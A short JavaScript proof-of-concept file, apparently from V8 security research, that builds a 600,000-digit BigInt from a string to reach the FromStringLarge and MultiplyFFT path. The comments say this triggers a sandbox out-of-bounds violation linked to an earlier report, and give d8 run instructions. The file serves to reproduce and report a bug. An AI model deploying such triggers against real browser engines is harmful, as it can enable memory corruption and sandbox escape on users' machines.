// V8 Sandbox Escape PoC - via BigInt fromString path
// ==============================================================================
//
// Path through FromStringLarge -> Multiply -> MultiplyFFT
// This was the path used in the original 474041332 report.
//
// Build: Same as poc_sandbox_violation_v5.js
// Run:   ./d8 --sandbox-testing poc_sandbox_violation_fromstring.js
// Expected: ## V8 sandbox violation detected!

// Create a very large BigInt from a string representation
// This triggers MultiplyFFT via FromStringLarge
const bigStr = "9".repeat(600000);
const result = BigInt(bigStr);

print("fromString completed (if we get here, OOB was not triggered)");
